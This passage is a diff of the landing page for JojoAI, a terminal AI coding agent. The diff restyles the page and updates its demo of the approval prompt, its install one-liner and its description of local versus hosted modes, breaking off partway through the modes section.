@@ -1,641 +1,544 @@
 <!doctype html>
-<html lang="en">
+<html lang="en" class="scroll-smooth">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>JojoAI</title>
-<meta name="description" content="jojo is a curses AI coding agent for the terminal. Run it fully local against your own Ollama, or connect to a hosted server. One install command; stdlib-only client; no telemetry.">
-<meta property="og:title" content="jojo — terminal coding agent">
-<meta property="og:description" content="A curses AI coding agent. Local against your own Ollama, or a hosted server.">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>JojoAI — a terminal AI coding agent</title>
+<meta name="description" content="A curses AI coding agent. Reads and edits files, runs commands, and drives a task end to end — with streamed reasoning and an approval prompt before every write. Run it against your own Ollama, or a hosted server.">
+<meta name="color-scheme" content="dark">
+<meta property="og:title" content="JojoAI — a terminal AI coding agent">
+<meta property="og:description" content="It proposes; you decide; it verifies. Local against your own Ollama, or a hosted GPU.">
+<meta property="og:type" content="website">
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap">
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = {
+  theme: {
+    extend: {
+      colors: {
+        void: '#05070a', ink: '#0a0e13', panel: '#0e141b', line: '#1b2733',
+        moss: '#6f8698', chalk: '#d7e3ec',
+        jade: '#5bffa5', cyan: '#4fd9ff', amber: '#ffc46b', rose: '#ff7a91',
+      },
+      fontFamily: {
+        mono: ['"JetBrains Mono"', 'ui-monospace', 'SFMono-Regular', 'monospace'],
+        sans: ['Inter', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+      },
+    },
+  },
+};
+</script>
+
 <style>
-  /* One visual world: a terminal. Committed single-theme; every colour explicit.
-     Palette lifted from tui/jojocode_ai/theme.py so the page and the app cannot
-     look like two products. */
-  :root{
-    --ground:#0a0e0b;         /* green-biased near-black — the app runs on #0b0b0b */
-    --panel:#0e1a12;          /* the TUI's own code-block background, verbatim */
-    --raise:#101d14;
-    --ink:#e7f2ea;            /* green-tinted off-white, not pure white */
-    --ink-dim:#9fc3ad;
-    --forest:#14532d; --pine:#166534; --grass:#22c55e; --leaf:#4ade80;
-    --mint:#86efac; --olive:#bde046; --sage:#96cdac; --moss:#4a7a5e;
-    --stop:#ef4444;          /* destructive / approval only — never decoration */
-    --wire:color-mix(in oklab, var(--sage) 14%, transparent);
-    --wire-lit:color-mix(in oklab, var(--mint) 34%, transparent);
-    --mono:"JetBrains Mono", ui-monospace, "SF Mono", "DejaVu Sans Mono", Menlo, Consolas, monospace;
-    --measure:74ch;
-    --step:1.7;
+  :root { --jade:#5bffa5; --cyan:#4fd9ff; --amber:#ffc46b; --line:#1b2733; }
+  html { -webkit-text-size-adjust: 100%; overflow-x: hidden; }
+  body {
+    background: #05070a;
+    color: #d7e3ec;
+    /* The page runs edge to edge; content clears the notch via its own gutter. */
+    padding: env(safe-area-inset-top) 0 env(safe-area-inset-bottom);
+    overflow-x: hidden;            /* nothing may scroll the page sideways */
   }
-  *{box-sizing:border-box}
-  html{scroll-behavior:smooth}
-  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  ::selection { background: rgba(91,255,165,.26); color: #eafff4; }
 
-  body{
-    margin:0;
-    background:var(--ground);
-    color:var(--ink);
-    font:15px/var(--step) var(--mono);
-    font-variant-ligatures:none;
-    -webkit-font-smoothing:antialiased;
-    overflow-x:hidden;
+  /* ── the gutter, set once ────────────────────────────────────────────── */
+  .gut { width: 100%; max-width: 1120px; margin-inline: auto; padding-inline: 20px; }
+  @media (min-width: 768px) { .gut { padding-inline: 32px; } }
+
+  /* ── animated gradient border ────────────────────────────────────────── */
+  .edge { position: relative; border-radius: 16px; background: #0e141b; isolation: isolate; }
+  .edge::before {
+    content: ''; position: absolute; inset: 0; border-radius: inherit; padding: 1px;
+    background: linear-gradient(135deg, rgba(91,255,165,.55), rgba(79,217,255,.28) 40%, rgba(27,39,51,.9) 70%);
+    -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+    -webkit-mask-composite: xor; mask-composite: exclude;
+    pointer-events: none; z-index: 1;
   }
-  ::selection{background:color-mix(in oklab, var(--grass) 40%, transparent);color:#fff}
-
-  a{color:var(--mint);text-decoration:none;text-underline-offset:3px}
-  a:hover{color:var(--olive);text-decoration:underline}
-  :focus-visible{outline:2px solid var(--olive);outline-offset:3px;border-radius:2px}
-
-  .wrap{max-width:var(--measure);margin:0 auto;padding:0 22px}
-
-  /* the divider is the app's theme.rule() — a smooth left→right green gradient */
-  .rule{
-    height:2px;border:0;margin:0;
-    background:linear-gradient(90deg,var(--forest),var(--pine),var(--grass),var(--leaf),var(--mint),var(--olive));
+  .edge-live::before {
+    background: linear-gradient(135deg, var(--jade), var(--cyan), rgba(27,39,51,.9), var(--jade));
+    background-size: 300% 300%;
+    animation: drift 9s ease-in-out infinite;
   }
-  .rule.soft{opacity:.5}
+  @keyframes drift { 0%,100%{background-position:0% 50%} 50%{background-position:100% 50%} }
 
-  /* ---------- top bar ---------- */
-  header.bar{
-    position:sticky;top:0;z-index:30;
-    display:flex;align-items:center;gap:20px;flex-wrap:wrap;
-    padding:11px 22px;
-    background:color-mix(in oklab, var(--ground) 78%, transparent);
-    backdrop-filter:blur(8px);
-    border-bottom:1px solid transparent;transition:border-color .2s;
+  /* ── glow ─────────────────────────────────────────────────────────────── */
+  .glow { box-shadow: 0 0 0 1px rgba(91,255,165,.14), 0 18px 60px -28px rgba(91,255,165,.5); }
+  .glow-text { text-shadow: 0 0 18px rgba(91,255,165,.45); }
+
+  /* ── hero headline gradient ──────────────────────────────────────────── */
+  .grad {
+    background: linear-gradient(120deg, #eafff4 0%, var(--jade) 42%, var(--cyan) 72%, #eafff4 100%);
+    background-size: 220% 100%;
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+    animation: sweep 11s ease-in-out infinite;
   }
-  header.bar.stuck{border-bottom-color:var(--wire)}
-  .brand{font-weight:800;letter-spacing:.02em;flex:none;font-size:15px}
-  .brand .chev{color:var(--olive)}
-  .brand .name{
-    background:linear-gradient(92deg,var(--pine),var(--mint),var(--olive));
-    background-size:220% 100%;
-    -webkit-background-clip:text;background-clip:text;color:transparent;
-    animation:sheen 11s linear infinite;
+  @keyframes sweep { 0%,100%{background-position:0% 50%} 50%{background-position:100% 50%} }
+
+  /* ── the terminal demo ───────────────────────────────────────────────── */
+  /* It scrolls inside its own box. The old page let it push the document
+     sideways on a phone, which is the single worst thing a layout can do. */
+  .term { overflow-x: auto; overflow-y: hidden; -webkit-overflow-scrolling: touch; scrollbar-width: thin; }
+  .term::-webkit-scrollbar { height: 6px; }
+  .term::-webkit-scrollbar-thumb { background: #1b2733; border-radius: 99px; }
+  .term-inner { min-width: 32rem; }          /* narrow screens: scroll it */
+  @media (min-width: 680px) { .term-inner { min-width: 0; } }
+  .term-wrap { position: relative; }
+  .term-wrap::after {                         /* a fade that says "more this way" */
+    content: ''; position: absolute; top: 0; right: 0; width: 34px; height: 100%;
+    background: linear-gradient(90deg, transparent, #0b1016); pointer-events: none; border-radius: 0 16px 16px 0;
   }
-  @keyframes sheen{to{background-position:220% 0}}
-  @media (prefers-reduced-motion:reduce){.brand .name{animation:none}}
-  header.bar nav{display:flex;gap:1px;flex-wrap:wrap;margin-left:auto}
-  header.bar nav a{
-    color:var(--moss);font-size:12px;letter-spacing:.04em;
-    padding:6px 9px;border-radius:6px;
-    transition:color .15s,background .15s;text-decoration:none;
+  @media (min-width: 680px) {
+    .term-wrap::after { display: none; }
+    .term { overflow-x: hidden; }
+    .term-inner > div { white-space: normal; overflow-wrap: anywhere; }
   }
-  header.bar nav a:hover{color:var(--mint)}
-  header.bar nav a[aria-current="true"]{color:var(--ground);background:var(--grass);font-weight:700}
 
-  /* ---------- hero: a rendered TUI ---------- */
-  .hero{padding:38px 0 44px}
-  .term{
-    border:1px solid var(--wire);
-    border-radius:7px;
-    background:var(--panel);
-    box-shadow:0 24px 60px -30px #000, inset 0 0 0 1px color-mix(in oklab, var(--grass) 5%, transparent);
-    padding:16px 18px 18px;
-    overflow-x:auto;
+  .cursor { display:inline-block; width:.55em; height:1.05em; background:var(--jade); vertical-align:-.16em; animation: blink 1.1s steps(2) infinite; }
+  @keyframes blink { 0%,50%{opacity:1} 50.01%,100%{opacity:0} }
+
+  /* ── reveal on scroll ────────────────────────────────────────────────── */
+  /* Starts visible and is only hidden once JS confirms it can reveal it —
+     otherwise a failed script leaves the whole page blank. */
+  .js .rise { opacity: 0; transform: translateY(14px); transition: opacity .6s ease, transform .6s ease; }
+  .js .rise.seen { opacity: 1; transform: none; }
+
+  /* ── nav ─────────────────────────────────────────────────────────────── */
+  .navlink { position: relative; }
+  .navlink::after {
+    content:''; position:absolute; left:0; right:0; bottom:-5px; height:1px;
+    background: linear-gradient(90deg, var(--jade), var(--cyan)); transform: scaleX(0);
+    transition: transform .25s ease; transform-origin: left;
   }
-  .term pre{margin:0;white-space:pre;font-size:13px;line-height:1.55}
-  .term .topline{display:flex;justify-content:space-between;align-items:flex-start;gap:16px}
-  .wordmark{font-weight:800;font-size:15px;letter-spacing:.08em}
-  .wordmark .chev{color:var(--olive)}
-  .wordmark .w{
-    background:linear-gradient(92deg,var(--forest),var(--pine),var(--grass),var(--leaf),var(--mint));
-    background-size:240% 100%;
-    -webkit-background-clip:text;background-clip:text;color:transparent;
-    animation:sheen 9s linear infinite;
+  .navlink:hover::after, .navlink:focus-visible::after { transform: scaleX(1); }
+
+  /* The mobile nav is a scrolling rail, not a wrapping pile of links.
+     Wrapping to three ragged lines is what it did before. */
+  .rail { overflow-x: auto; scrollbar-width: none; }
+  .rail::-webkit-scrollbar { display: none; }
+
+  :focus-visible { outline: 2px solid var(--jade); outline-offset: 3px; border-radius: 6px; }
+
+  table { border-collapse: collapse; }
+
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { animation: none !important; transition: none !important; }
+    .js .rise { opacity: 1; transform: none; }
   }
-  .cat{color:var(--mint);font-size:12px;line-height:1.3;text-align:right;flex:none}
-  .cat .z{color:var(--moss)}
-  .termrule{height:2px;margin:9px 0 12px;background:linear-gradient(90deg,var(--forest),var(--grass),var(--mint),var(--olive))}
-  .you{color:var(--mint);text-align:right}
-  .you .meta{color:var(--moss)}
-  .lbl{color:var(--olive);font-weight:700}
-  .lbl .t{color:var(--moss);font-weight:400}
-  .say{color:var(--ink)}
-  .think{color:var(--sage);font-style:italic}
-  .think .g{color:var(--grass);font-style:normal}
-  .tool{color:var(--grass)}
-  .tool .arg{color:var(--moss)}
-  .approve{color:var(--olive)}
-  .approve .bar2{color:var(--olive)}
-  .approve .keys b{color:var(--ink)}
-  .done{color:var(--moss)}
-
-  .hero h1{
-    margin:26px 0 12px;font-size:clamp(1.9rem,5vw,2.9rem);line-height:1.08;
-    font-weight:800;letter-spacing:-.02em;text-wrap:balance;
-  }
-  .hero h1 .g{
-    background:linear-gradient(96deg,var(--pine) 8%,var(--mint) 52%,var(--olive) 96%);
-    background-size:200% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;
-    animation:sheen 12s linear infinite;
-  }
-  @media (prefers-reduced-motion:reduce){.wordmark .w,.hero h1 .g{animation:none}}
-  .hero p.lede{max-width:64ch;margin:0 0 22px;color:var(--ink-dim);font-size:15px;line-height:1.62}
-  .hero p.lede b{color:var(--ink);font-weight:700}
-
-  /* ---------- the install command ---------- */
-  .cmd{
-    display:flex;align-items:center;gap:12px;
-    padding:14px 16px;background:var(--raise);
-    border:1px solid var(--wire);border-left:3px solid var(--grass);
-    border-radius:6px;overflow-x:auto;
-  }
-  .cmd .p{color:var(--moss);flex:none;user-select:none}
-  .cmd code{color:var(--mint);white-space:pre;font-size:13.5px}
-  .cmd button{
-    margin-left:auto;flex:none;font:inherit;font-size:12px;cursor:pointer;
-    color:var(--moss);background:transparent;border:1px solid var(--wire);
-    border-radius:6px;padding:5px 11px;transition:color .15s,border-color .15s;
-  }
-  .cmd button:hover{color:var(--mint);border-color:var(--grass)}
-  .tabs{display:flex;gap:6px;margin-top:12px}
-  .tabs button{
-    font:inherit;font-size:12px;cursor:pointer;padding:6px 14px;
-    color:var(--moss);background:transparent;
-    border:1px solid var(--wire);border-bottom:none;border-radius:6px 6px 0 0;
-  }
-  .tabs button[aria-selected="true"]{color:var(--ground);background:var(--grass);border-color:var(--grass);font-weight:700}
-
-  /* ---------- sections ---------- */
-  section{padding:44px 0}
-  .head{margin-bottom:22px}
-  .head .prompt{
-    display:block;font-size:12px;letter-spacing:.16em;text-transform:uppercase;
-    color:var(--moss);margin-bottom:10px;
-  }
-  .head .prompt::before{content:"❯ ";color:var(--grass)}
-  .head h2{margin:0 0 8px;font-size:clamp(1.35rem,3.6vw,1.9rem);font-weight:700;letter-spacing:-.015em;text-wrap:balance}
-  .head p{margin:0;max-width:66ch;color:var(--ink-dim);line-height:1.62}
-
-  /* ---------- status strip ---------- */
-  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(9.5rem,1fr));gap:1px;background:var(--wire);border:1px solid var(--wire);border-radius:7px;overflow:hidden}
-  .cell{background:var(--ground);padding:15px 16px;display:flex;flex-direction:column;gap:3px}
-  .cell .v{font-size:1.35rem;font-weight:700;letter-spacing:-.02em;color:var(--ink);line-height:1.1;font-variant-numeric:tabular-nums}
-  .cell .k{font-size:11.5px;letter-spacing:.06em;color:var(--ink-dim)}
-  .cell .n{font-size:11px;color:var(--moss)}
-  .dot{width:8px;height:8px;border-radius:50%;background:var(--moss);display:inline-block;margin-right:7px;vertical-align:2px}
-  .dot.up{background:var(--grass);box-shadow:0 0 0 3px color-mix(in oklab,var(--grass) 22%,transparent)}
-  .dot.down{background:var(--stop);box-shadow:0 0 0 3px color-mix(in oklab,var(--stop) 22%,transparent)}
-
-  /* ---------- two-column explainer ---------- */
-  .modes{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--wire);border:1px solid var(--wire);border-radius:7px;overflow:hidden}
-  @media (max-width:640px){.modes{grid-template-columns:1fr}}
-  .mode{background:var(--panel);padding:18px 20px}
-  .mode .tag{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--olive)}
-  .mode h3{margin:6px 0 8px;font-size:1rem;color:var(--mint);font-weight:700}
-  .mode p{margin:0;color:var(--ink-dim);font-size:13px;line-height:1.6}
-  .mode code{color:var(--mint)}
-
-  .diagram{margin-top:16px;border:1px solid var(--wire);border-radius:7px;background:var(--raise);padding:16px}
-  .diagram svg{display:block;width:100%;height:auto}
-
-  /* ---------- prose + tables (not everything is a card) ---------- */
-  .prose p{max-width:66ch;color:var(--ink-dim);line-height:1.66;margin:0 0 12px}
-  .prose p b{color:var(--ink)}
-  .prose code, .kv code, table code{color:var(--mint)}
-
-  .loop{list-style:none;margin:16px 0 0;padding:0;display:grid;gap:2px}
-  .loop li{padding:11px 14px;background:var(--panel);border-left:2px solid var(--wire-lit);color:var(--ink-dim);font-size:13px}
-  .loop li b{color:var(--ink)}
-
-  table{width:100%;border-collapse:collapse;margin-top:8px;font-size:13px}
-  th,td{text-align:left;padding:11px 14px 11px 0;border-bottom:1px solid var(--wire);vertical-align:top}
-  th{font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--moss);font-weight:500}
-  td:first-child{white-space:nowrap;color:var(--ink);padding-right:22px}
-  td .n{color:var(--moss);font-size:12px}
-  tr:last-child td{border-bottom:none}
-
-  /* keyboard reference */
-  .kbmap{display:grid;grid-template-columns:repeat(auto-fit,minmax(15.5rem,1fr));gap:22px 34px;margin-top:8px}
-  .kbmap section{padding:0}
-  .kbmap h3{margin:0 0 10px;font-size:11.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--olive);font-weight:700}
-  .kbmap dl{margin:0;display:grid;grid-template-columns:auto 1fr;gap:9px 14px;align-items:baseline}
-  .kbmap dt{white-space:nowrap}
-  .kbmap dd{margin:0;color:var(--ink-dim);font-size:12.5px;line-height:1.4}
-  kbd{
-    display:inline-block;padding:2px 7px;border-radius:5px;
-    background:var(--raise);border:1px solid var(--wire);border-bottom-width:2px;
-    color:var(--ink);font:inherit;font-size:11.5px;font-weight:500;line-height:1.35;
-  }
-  kbd + kbd{margin-left:3px}
-
-  .kv{margin-top:8px;display:grid;gap:2px}
-  .kv > div{display:grid;grid-template-columns:12.5rem 1fr;gap:14px;padding:11px 0;border-bottom:1px solid var(--wire)}
-  .kv > div:last-child{border-bottom:none}
-  @media (max-width:560px){.kv > div{grid-template-columns:1fr}}
-  .kv dt{color:var(--ink);font-weight:700}
-  .kv dd{margin:0;color:var(--ink-dim);font-size:12.5px;line-height:1.55}
-
-  pre.block{
-    margin:0;padding:13px 15px;background:var(--panel);border:1px solid var(--wire);
-    border-radius:6px;overflow-x:auto;font-size:12.5px;line-height:1.7;color:var(--mint);
-  }
-  .stack{display:grid;gap:12px;margin-top:8px}
-  .stack .cap{color:var(--moss);font-size:12px;margin:0 0 4px;letter-spacing:.04em}
-
-  footer{padding:38px 0 60px;border-top:1px solid var(--wire);margin-top:12px;color:var(--moss);font-size:12px;line-height:1.7}
-  footer a{color:var(--ink-dim)}
-  footer .big{color:var(--ink-dim)}
 </style>
 </head>
-<body>
-<hr class="rule">
 
-<header class="bar" id="bar">
-  <span class="brand"><span class="chev">❯❯</span> <span class="name">JojoAI</span></span>
-  <nav id="nav">
-    <a href="#run">Run it</a>
-    <a href="#modes">Local / remote</a>
-    <a href="#loop">The loop</a>
-    <a href="#models">Models</a>
-    <a href="#keys">Keys</a>
-    <a href="#security">Security</a>
-    <a href="#status">Status</a>
-    <a href="https://github.com/persxn/jojocode-tui">Source</a>
-  </nav>
+<body class="font-sans antialiased">
+<script>document.documentElement.classList.add('js');</script>
+
+<!-- three.js lives behind everything, fixed, and never intercepts a tap -->
+<canvas id="bg" class="fixed inset-0 -z-10 h-full w-full opacity-[.55]" aria-hidden="true"></canvas>
+<div class="pointer-events-none fixed inset-0 -z-10 bg-[radial-gradient(ellipse_80%_55%_at_50%_-10%,rgba(91,255,165,.13),transparent_70%)]" aria-hidden="true"></div>
+
+<!-- ─────────────────────────────────────────────────────────── nav ── -->
+<header class="sticky top-0 z-50 border-b border-line/70 bg-void/80 backdrop-blur-xl" style="top: env(safe-area-inset-top, 0px)">
+  <div class="gut flex items-center gap-4 py-3">
+    <a href="#top" class="flex shrink-0 items-center gap-2 font-mono text-[15px] font-bold tracking-tight">
+      <span class="text-jade glow-text">&gt;&gt;</span>
+      <span class="text-chalk">Jojo<span class="text-jade">AI</span></span>
+    </a>
+    <nav class="rail -mx-2 flex min-w-0 flex-1 items-center gap-5 px-2 font-mono text-[12.5px] text-moss">
+      <a class="navlink shrink-0 hover:text-chalk" href="#run">Run it</a>
+      <a class="navlink shrink-0 hover:text-chalk" href="#modes">Local / remote</a>
+      <a class="navlink shrink-0 hover:text-chalk" href="#loop">The loop</a>
+      <a class="navlink shrink-0 hover:text-chalk" href="#web">Web search</a>
+      <a class="navlink shrink-0 hover:text-chalk" href="#models">Models</a>
+      <a class="navlink shrink-0 hover:text-chalk" href="#keys">Keys</a>
+      <a class="navlink shrink-0 hover:text-chalk" href="#security">Security</a>
+      <a class="navlink shrink-0 hover:text-chalk" href="#status">Status</a>
+    </nav>
+    <a href="#run" class="hidden shrink-0 rounded-lg border border-jade/40 bg-jade/10 px-3 py-1.5 font-mono text-[12.5px] font-medium text-jade transition hover:bg-jade/20 sm:block">Install</a>
+  </div>
 </header>
 
-<div class="wrap">
-  <section class="hero" id="top">
-    <div class="term" role="img" aria-label="The jojo terminal UI mid-task: a request, streamed reasoning, a tool call, and an approval prompt.">
-      <div class="topline">
-        <span class="wordmark"><span class="chev">❯❯</span> <span class="w">JojoAI</span></span>
-        <pre class="cat"> /\_/\
-( o.o ) <span class="z">~</span></pre>
-      </div>
-      <div class="termrule"></div>
-<pre><span class="you"><span class="meta">you · 14:22</span>  ▐
-add a --json flag to the export command, plus a test</span>
+<main id="top">
 
-<span class="lbl">▌ jojo ·<span class="t"> 14:22</span></span>
-<span class="think"><span class="g">┊</span> export.py already parses argv by hand — I'll add the flag there,</span>
-<span class="think"><span class="g">┊</span> branch the writer, and cover both shapes in test_export.py.</span>
-<span class="tool">▸ read_file <span class="arg">cli/export.py</span></span>
-<span class="tool">▸ read_file <span class="arg">tests/test_export.py</span></span>
+<!-- ────────────────────────────────────────────────────────── hero ── -->
+<section class="gut pb-14 pt-12 sm:pt-20">
+  <div class="grid items-center gap-10 lg:grid-cols-[1fr_1.12fr] lg:gap-14">
 
-<span class="approve">approve  write_file  cli/export.py  ?</span>
-<span class="approve"><span class="bar2">│</span> + def _emit_json(rows): ...</span>
-<span class="approve"><span class="bar2">│</span> + if args.json: return _emit_json(rows)</span>
-<span class="approve">└─ <span class="keys"><b>[y]</b>es  <b>[n]</b>o  <b>[a]</b>lways this session</span></span>
+    <div class="rise min-w-0">
+      <span class="inline-flex items-center gap-2 rounded-full border border-line bg-panel/70 px-3 py-1 font-mono text-[11.5px] text-moss">
+        <span class="h-1.5 w-1.5 rounded-full bg-jade"></span> stdlib-only client · no telemetry
+      </span>
 
-<span class="done">── model_done · 4 tools · 3.1k→840 tok · 11.4s</span></pre>
-    </div>
+      <h1 class="mt-5 text-balance font-sans text-[clamp(2.1rem,7.4vw,3.9rem)] font-700 font-bold leading-[1.04] tracking-[-0.03em]">
+        <span class="grad">Write the task.</span><br>
+        <span class="text-chalk">Watch it work.</span>
+      </h1>
 
-    <h1>Write the task.<br><span class="g">Watch it work.</span></h1>
-    <p class="lede">
-      <b>jojo</b> is a curses AI coding agent. It reads and edits files, runs
-      commands, and drives a task end to end — streaming its reasoning, showing
-      every tool call, and stopping at an approval prompt before each write.
-      Run it <b>fully local</b> against your own Ollama, or point it at a
-      <b>hosted server</b> and keep your laptop light.
-    </p>
+      <p class="mt-5 max-w-[56ch] text-[15px] leading-relaxed text-moss">
+        <code class="rounded bg-panel px-1.5 py-0.5 font-mono text-[13.5px] text-jade">jojo</code>
+        is a curses AI coding agent. It reads and edits files, runs commands, searches
+        the web, and drives a task end to end — streaming its reasoning, showing every
+        tool call, and stopping at an approval prompt before each write.
+      </p>
 
-    <div id="run">
-      <div class="cmd">
-        <span class="p">$</span><code id="cmd">curl -fsSL https://ai.jojocode.in/install.sh | sh</code>
-        <button type="button" onclick="copyCmd(this)">copy</button>
-      </div>
-      <div class="tabs" role="tablist" aria-label="Install command by platform">
-        <button type="button" role="tab" aria-selected="true"  onclick="setOS(this,'nix')">Linux / macOS</button>
-        <button type="button" role="tab" aria-selected="false" onclick="setOS(this,'win')">Windows</button>
+      <div class="mt-7 max-w-2xl">
+        <div class="edge edge-live glow overflow-hidden">
+          <div class="relative z-[2] flex items-center gap-3 px-3.5 py-3">
+            <span class="select-none font-mono text-jade">$</span>
+            <code id="cmd" class="min-w-0 flex-1 break-all font-mono text-[12.5px] leading-relaxed text-chalk sm:text-[13.5px]">curl -fsSL https://ai.jojocode.in/install.sh | sh</code>
+            <button type="button" onclick="copyCmd(this)"
+              class="shrink-0 rounded-md border border-line bg-ink px-2.5 py-1 font-mono text-[11.5px] text-moss transition hover:border-jade/50 hover:text-jade">copy</button>
+          </div>
+        </div>
+        <p class="mt-2.5 font-mono text-[11.5px] text-moss">
+          Linux / macOS · Windows: <a class="text-cyan underline decoration-cyan/30 underline-offset-2 hover:decoration-cyan" href="#run">PowerShell one-liner</a>
+        </p>
       </div>
     </div>
-  </section>
-</div>
-<hr class="rule">
 
-<div class="wrap">
-  <section id="statstrip" aria-label="At a glance">
-    <div class="stats">
-      <div class="cell">
-        <span class="v"><span class="dot" id="dot"></span><span id="state">checking…</span></span>
-        <span class="k">hosted service</span><span class="n" id="statenote">ai.jojocode.in</span>
-      </div>
-      <div class="cell">
-        <span class="v" id="seats">—</span>
-        <span class="k">seats free</span><span class="n" id="model">—</span>
-      </div>
-      <div class="cell">
-        <span class="v">0</span>
-        <span class="k">runtime deps</span><span class="n">stdlib-only client</span>
-      </div>
-      <div class="cell">
-        <span class="v">0</span>
-        <span class="k">telemetry</span><span class="n">nothing phones home</span>
-      </div>
-    </div>
-  </section>
-</div>
-<hr class="rule soft">
+    <!-- the demo -->
+    <div class="rise min-w-0">
+      <div class="term-wrap edge glow">
+        <div class="term relative z-[2] rounded-2xl bg-[#0b1016] p-4 font-mono text-[12px] leading-[1.75] sm:text-[12.5px]">
+          <div class="term-inner">
+            <div class="flex items-start justify-between">
+              <span class="font-bold"><span class="text-jade">&gt;&gt;</span> <span class="text-chalk">JojoAI</span></span>
+              <pre class="text-[10px] leading-tight text-moss select-none">  /\_/\
+ ( o.o ) ~</pre>
+            </div>
+            <div class="my-3 h-px bg-gradient-to-r from-jade/70 via-cyan/40 to-transparent"></div>
 
-<div class="wrap">
-  <section id="modes">
-    <div class="head">
-      <span class="prompt">local or remote</span>
-      <h2>Two ways to run the same agent</h2>
-      <p>The client is identical either way — one curses app. What changes is
-        where the loop runs and whose GPU answers.</p>
-    </div>
-    <div class="modes">
-      <div class="mode">
-        <span class="tag">local</span>
-        <h3>Your machine, your model</h3>
-        <p>The loop runs on your box and talks straight to Ollama on
-          <code>127.0.0.1:11434</code>. Nothing leaves the machine at runtime.
-          <code>ollama-setup.sh</code> installs the runtime;
-          <code>recommend-model.py</code> reads your RAM / VRAM / unified memory
-          and pulls a model that fits.</p>
-      </div>
-      <div class="mode">
-        <span class="tag">remote</span>
-        <h3>Someone else's GPU</h3>
-        <p><code>jojo --remote https://host --login</code> — email and a one-time
-          code, then a WebSocket session. The server runs the loop and the big
-          model; tool calls still execute <b>locally</b>, path-jailed to your
-          project, and you approve every destructive one. A drop resumes without
-          re-running a side effect.</p>
+            <div class="text-right text-moss">you · 14:22 <span class="cursor align-middle"></span></div>
+            <div class="text-right text-chalk">add a --json flag to the export command, plus a test</div>
+
+            <div class="mt-3 text-cyan">▌ jojo · 14:22</div>
+            <div class="text-moss">┊ export.py parses argv by hand — I'll add the flag there,</div>
+            <div class="text-moss">┊ branch the writer, and cover both shapes in test_export.py.</div>
+            <div class="text-jade">▸ read_file <span class="text-moss">cli/export.py</span></div>
+            <div class="text-jade">▸ web_search <span class="text-moss">"argparse json output convention"</span></div>
+
+            <div class="mt-3 rounded-lg border border-amber/25 bg-amber/[.06] p-2.5">
+              <div class="text-amber">approve <span class="text-chalk">write_file</span> <span class="text-moss">cli/export.py</span> ?</div>
+              <div class="mt-1 text-jade">│ + def _emit_json(rows): ...</div>
+              <div class="text-jade">│ + if args.json: return _emit_json(rows)</div>
+              <div class="mt-1 text-moss">└─ <b class="text-chalk">[y]</b>es <b class="text-chalk">[n]</b>o <b class="text-chalk">[a]</b>lways this session</div>
+            </div>
+
+            <div class="mt-3 text-[11px] text-moss">── model_done · 5 tools · 3.1k→840 tok · 11.4s</div>
+          </div>
+        </div>
       </div>
     </div>
-    <div class="diagram">
-      <svg viewBox="0 0 720 128" role="img" aria-label="Data flow: your machine exchanges turns and tool results with the agent loop; the loop exchanges prompts and tokens with Ollama.">
-        <defs>
-          <marker id="a" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
-            <path d="M0 0 L6 3 L0 6 Z" fill="#4ade80"/>
-          </marker>
-        </defs>
-        <g font-family="JetBrains Mono, monospace" font-size="11" fill="#9fc3ad">
-          <rect x="6" y="34" width="150" height="60" rx="8" fill="#0e1a12" stroke="#2b4133"/>
-          <text x="81" y="60" text-anchor="middle" fill="#e7f2ea" font-weight="700">jojo · you</text>
-          <text x="81" y="79" text-anchor="middle">tools · approvals</text>
+  </div>
 
-          <rect x="285" y="34" width="150" height="60" rx="8" fill="#0e1a12" stroke="#2b4133"/>
-          <text x="360" y="60" text-anchor="middle" fill="#e7f2ea" font-weight="700">agent loop</text>
-          <text x="360" y="79" text-anchor="middle">local · or server</text>
+  <!-- stats -->
+  <div class="rise mt-12 grid grid-cols-2 gap-3 sm:gap-4 lg:grid-cols-4">
+    <div class="edge p-4"><div class="relative z-[2]"><div id="seats" class="font-mono text-2xl font-bold text-jade">—</div><div class="mt-1 text-[12px] text-moss">seats free</div></div></div>
+    <div class="edge p-4"><div class="relative z-[2]"><div id="state" class="font-mono text-2xl font-bold text-chalk">checking…</div><div class="mt-1 text-[12px] text-moss">hosted service</div></div></div>
+    <div class="edge p-4"><div class="relative z-[2]"><div class="font-mono text-2xl font-bold text-chalk">0</div><div class="mt-1 text-[12px] text-moss">runtime deps</div></div></div>
+    <div class="edge p-4"><div class="relative z-[2]"><div class="font-mono text-2xl font-bold text-chalk">0</div><div class="mt-1 text-[12px] text-moss">telemetry</div></div></div>
+  </div>
+</section>
 
-          <rect x="564" y="34" width="150" height="60" rx="8" fill="#0e1a12" stroke="#2b4133"/>
-          <text x="639" y="60" text-anchor="middle" fill="#e7f2ea" font-weight="700">Ollama</text>
-          <text x="639" y="79" text-anchor="middle">gpt-oss · qwen</text>
+<!-- ───────────────────────────────────────────────────────── modes ── -->
+<section id="modes" class="gut scroll-mt-20 border-t border-line/60 py-16">
+  <p class="rise font-mono text-[12px] uppercase tracking-[.18em] text-jade">local or remote</p>
+  <h2 class="rise mt-2 text-balance text-[clamp(1.5rem,4.2vw,2.15rem)] font-bold tracking-tight text-chalk">Two ways to run the same agent</h2>
